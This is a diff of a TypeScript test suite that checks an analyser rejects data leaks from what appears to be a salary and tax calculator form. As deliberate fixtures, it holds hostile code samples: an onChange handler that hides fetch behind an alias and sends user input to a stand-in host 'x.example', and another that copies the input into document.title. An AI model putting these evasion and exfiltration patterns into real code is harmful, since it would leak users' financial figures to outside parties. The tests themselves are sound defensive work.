+      "onChange={(e) => { const { fetch: send } = self; send.call(self, '/' + '/x.example/g?v=' + e.target.value); set('gross')(e.target.value) }}",
+      'property: fetch',
+    ],
+    [
+      'document.title, hidden by shadowing `document` in an unrelated callback',
+      'document',
+      "onChange={(e) => { document['title'] = e.target.value + '/' + steuerklasse; set('gross')(e.target.value) }}",
+      'property: title',
+    ],
+  ];
+
+  for (const [label, shadow, leak, pin] of SHADOWED_LEAKS) {
+    it(`rejects ${label}`, () => {
+      const found = violations(mutate(leak, SHADOW(shadow)));
+      expect(found.length, `the analyser accepted: ${leak}`).toBeGreaterThan(0);
+      // BOTH pins fire here, and that is the point: real scoping restores the
+      // free-identifier catch, and counting destructuring as a read restores
+      // the property catch. Either alone would have stopped this leak.
+      expect(found.join(' | '), `the property pin did not fire`).toContain(pin);
+      expect(found.join(' | '), `the free-identifier pin did not fire`).toContain(`free identifier: ${shadow}`);
+    });
+  }
+
+  for (const [label, leak, pin] of LEAKS) {
     it(`rejects ${label}`, () => {
       const found = violations(mutate(leak));
       expect(found.length, `the analyser accepted: ${leak}`).toBeGreaterThan(0);
+      expect(
+        found.join(' | '),
+        `caught, but not by the pin this control is about (${pin})`,
+      ).toContain(pin);
     });
   }
 
@@ -1300,8 +1799,48 @@ describe.each(CLOSURE_FILES)('no external origin can be referenced at all (%s)',
   it('puts no computed value into any attribute that CSS or a URL can read', () => {
     // Not just data-*: className, id, title and aria-* are all selectable and
     // all can carry a number.
-    const ATTR = /\b(data-[a-z-]+|className|id|title|aria-[a-z-]+)\s*=\s*(\{[^}]*\}|"[^"]*")/g;
-    const attrs = Array.from(src.matchAll(ATTR), (m) => [m[1], m[2]] as const);
+    // BRACE-BALANCED, not `\{[^}]*\}`. The lazy form truncated
+    // `id={`decc-err-${p.control}`}` at the inner `}` and handed the assertions
+    // a value that was not the value — a nested template or object literal
+    // could be split anywhere its author chose, and the surviving prefix
+    // compared against a pattern that had no idea it was looking at half a
+    // string. The scan below reads the whole attribute or reports it.
+    const ATTR_NAME = /\b(data-[a-z-]+|className|id|title|aria-[a-z-]+)\s*=\s*/g;
+    const readValue = (from: number): string | null | undefined => {
+      if (src[from] === '"') {
+        const end = src.indexOf('"', from + 1);
+        return end === -1 ? null : src.slice(from, end + 1);
+      }
+      // Not a JSX attribute at all — `?id=123` inside a statute URL in the
+      // source registry reaches here, and skipping it is correct. `null` is
+      // reserved for a value that STARTS like an attribute and does not close.
+      if (src[from] !== '{') return undefined;
+      let depth = 0;
+      for (let i = from; i < src.length; i++) {
+        if (src[i] === '{') depth++;
+        else if (src[i] === '}' && --depth === 0) return src.slice(from, i + 1);
+      }
+      return null;
+    };
+    // aria-invalid and aria-describedby are computed BY DESIGN — they exist so a
+    // screen reader can be told which field is at fault, which means they have
+    // to vary with the fault. Their values come from two one-line helpers whose
+    // whole range is `true`/`undefined` and `decc-err-<control>`; neither can
+    // carry a figure, and the id anchor itself is checked by the rule above.
+    const ARIA_ERROR = /^\{(invalid|errorId)\('[a-zA-Z0-9]+'\)\}$/;
+    const attrs: Array<readonly [string, string]> = [];
+    for (const m of src.matchAll(ATTR_NAME)) {
+      const value = readValue(m.index + m[0].length);
+      if (value === undefined) continue;
+      expect(value, `unbalanced attribute value for ${m[1]}`).not.toBe(null);
+      attrs.push([m[1], value] as const);
+    }
+    // Non-emptiness only where attributes must exist: this rule runs over the
+    // whole closure, and the engine modules render nothing. Without the guard a
+    // renamed component would make the rule vacuous rather than fail.
+    if (file === COMPONENT || file === BOUNDARY) {
+      expect(attrs.length, `no attributes were found in ${file}`).toBeGreaterThan(5);
+    }
     for (const [name, value] of attrs) {
       if (name === 'data-severity') {
         expect(value, 'data-severity must carry the note severity and nothing else').toBe('{n.severity}');
@@ -1309,8 +1848,18 @@ describe.each(CLOSURE_FILES)('no external origin can be referenced at all (%s)',
       }
       // Allowed dynamic values: a locale-keyed lookup and a loop key. Neither
       // can carry a figure, and both are named rather than pattern-matched.
-      const ALLOWED_DYNAMIC = new Set(['{LANG[locale]}', '{c.key}', '{n.key}', '{i.field}', '{k}', '{b}', '{c.id}']);
+      // `id={`decc-err-${p.control}`}` is the anchor an input's
+      // aria-describedby points at. `p.control` is one of nine fixed control
+      // names — gross, supplement, u1, u2, accident, children, steuerklasse,
+      // kinderfreibetraege, workplace — set by the two maps in copy.ts and
+      // never derived from an input, so it can carry no figure. Named rather
+      // than pattern-matched, like every other exception here.
+      const ALLOWED_DYNAMIC = new Set([
+        '{LANG[locale]}', '{c.key}', '{n.key}', '{i.field}', '{k}', '{b}', '{c.id}',
+        '{`decc-err-${p.control}`}',
+      ]);
       if (ALLOWED_DYNAMIC.has(value)) continue;
+      if ((name === 'aria-invalid' || name === 'aria-describedby') && ARIA_ERROR.test(value)) continue;
       // A translation lookup. `tr(FIELD.u1)` resolves to a fixed sentence from
       // copy.ts and cannot carry a figure — the copy module holds no input and
       // is itself inside this gate's file list.
